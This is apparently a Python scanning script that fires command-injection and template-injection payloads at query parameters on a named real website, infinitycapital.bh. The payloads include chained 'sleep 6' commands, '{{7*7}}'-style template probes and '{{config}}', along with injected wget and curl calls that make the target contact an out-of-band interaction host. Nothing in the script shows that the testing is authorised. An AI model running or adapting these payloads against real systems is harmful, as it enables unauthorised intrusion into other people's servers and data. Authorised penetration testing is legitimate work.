import subprocess, time, urllib.parse
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
OOBH="oob53cf5528146e."+"dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def req(url, data=None, hdrs=None, timeout=30):
    c=["curl","-s","-m",str(timeout),"-A",UA,"-o","/tmp/rq.bin","-w","%{http_code}|%{size_download}|%{time_total}"]
    for h in (hdrs or []): c += ["-H",h]
    if data: c += ["--data-binary",data]
    c.append(url)
    t0=time.time()
    r=subprocess.run(c,capture_output=True,text=True)
    body=open("/tmp/rq.bin","rb").read()
    return r.stdout, body

def esc(p): return urllib.parse.quote(p,safe='')

# ---------------- CMDi payloads (time + OOB) ----------------
cmdi = [
 "2; sleep 6", "2 | sleep 6", "2$(sleep 6)", "2`sleep 6`", "2; sleep 6 #", "2\nsleep 6",
 "2 || sleep 6", "2 & sleep 6", "2%0asleep 6", "2;sleep 6", "2;wget http://"+OOBH+"/cmdi", "2;curl http://"+OOBH+"/cmdi2",
]
# ---------------- SSTI payloads ----------------
ssti = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}", "{{config}}", "${{7*7}}", "{{7*7}}$", "*{7*7}"]

def baseline(url, hdrs=None):
    out,_=req(url,hdrs=hdrs); return out

print("### BASELINES")
for name,url in [("home_page","https://www.infinitycapital.bh/?page=2"),
                 ("contact_cb","https://www.infinitycapital.bh/contact?cb=1"),
                 ("api","https://www.infinitycapital.bh/api?id=1")]:
    print(name, baseline(url))

print("\n### CMDi (time-based) on /?page=")
for p in cmdi:
    out,_=req("https://www.infinitycapital.bh/?page="+esc(p))
    print("  %-28s -> %s"%(repr(p)[:28],out))

print("\n### SSTI on /?page= (reflection of 49?)")
for p in ssti:
    out,body=req("https://www.infinitycapital.bh/?page="+esc(p))
    hit = b"49" in body
    print("  %-18s -> %s  49_present=%s len=%d"%(p,out,hit,len(body)))

print("\n### CMDi/SSTI on /contact?cb=")
for p in ["1; sleep 6","1$(sleep 6)","{{7*7}}","${7*7}"]:
    out,body=req("https://www.infinitycapital.bh/contact?cb="+esc(p))
    print("  %-18s -> %s 49=%s"%(p,out,b"49" in body))
